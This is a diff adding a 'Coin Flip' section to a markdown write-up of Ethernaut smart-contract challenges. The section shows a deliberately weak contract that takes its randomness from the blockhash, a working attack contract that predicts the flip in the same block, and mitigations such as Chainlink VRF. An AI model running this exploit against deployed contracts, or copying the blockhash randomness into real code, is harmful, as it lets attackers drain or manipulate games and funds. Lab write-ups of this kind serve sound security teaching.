@@ -1,6 +1,7 @@
 # Challenges
 1. [Fallback](#1-fallback)
 2. [Fallout](#2-fallout)
+3. [Coin Flip](#3-coin-flip)
 # 1. Fallback
 ### Challenge
 - Claim ownership of the contract.
@@ -125,3 +126,78 @@ Solidity compiler throws an error if there is a function with the name of the co
 \
 Hurray! We got another ownership.
 
+# 3. Coin Flip
+### Challenge
+- Predict the outcome coin flip 10 times in a row.
+### Purpose
+Understanding generating random numbers in solidity can be tricky. 
+### Contract
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  constructor() {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(blockhash(block.number - 1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = blockValue / FACTOR;
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+```
+### Solution
+##### Explanation
+There currently isn't a native way to generate them, and everything we use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like block hashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.\
+I create another contract to attack `CoinFlip` by exploiting the same logic and factor used in it. Making an external call from an attack contract sends one transaction so that both will have the same block information.
+##### Exploit
+```
+import "./CoinFlip.sol"
+
+contract AttackCoinFlip {
+    CoinFlip public target;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(CoinFlip _target) {
+        target = _target; // instance of the CoinFlip contract to be attacked
+    }
+
+    // Attack function
+    function attack() public {
+        // Logic implementation used in flip() of CoinFlip
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool guess = coinFlip == 1 ? true : false;
+        // Attacking contract
+        bool attackSuccess = target.flip(guess);
+        require(attackSuccess, "Attack failed");
+    }
+}
+```
+1. Deploy the `AttackCoinFlip` contract with `CoinFlip` address as an argument.
+2. Invoke `attack` 10 times to increase `consecutiveWins` in CoinFlip (check whether `consecutiveWins` has a value minimum of 10).\
+\
+Submit the contract instance on Ethernaut to claim the win.\
+To get cryptographically proven random numbers, we can use Chainlink VRF, which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.\
+Some other options include using Bitcoin block headers (verified through BTC Relay, RANDAO, or Oraclize).
